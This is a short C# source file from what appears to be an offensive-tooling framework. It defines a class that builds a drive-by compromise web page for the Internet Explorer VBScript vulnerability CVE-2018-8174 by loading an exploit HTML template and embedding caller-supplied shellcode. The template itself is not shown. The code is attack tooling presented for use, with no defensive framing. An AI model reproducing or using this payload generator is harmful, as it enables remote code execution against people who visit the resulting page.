using System.IO;

using MyWarez.Core;

namespace MyWarez.Payloads
{
    // IE VBScript Exploit (CVE-2018-8174)
    public sealed class CVE_2018_8174 : OnePageWebsite
    {
        // Note: payload might execute twice
        public CVE_2018_8174(IShellcode shellcode) : base(string.Format(Template, Utils.TransformShellcode(shellcode.Bytes, shellcode.Arch, "js_le"))) { }
        private static readonly string TemplateFileName = "exploit_template.html";
        private static readonly string TemplateFilePath = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "DriveByCompromise", typeof(CVE_2018_8174).Name, TemplateFileName);
        private static readonly string Template = File.ReadAllText(TemplateFilePath);
    }
}
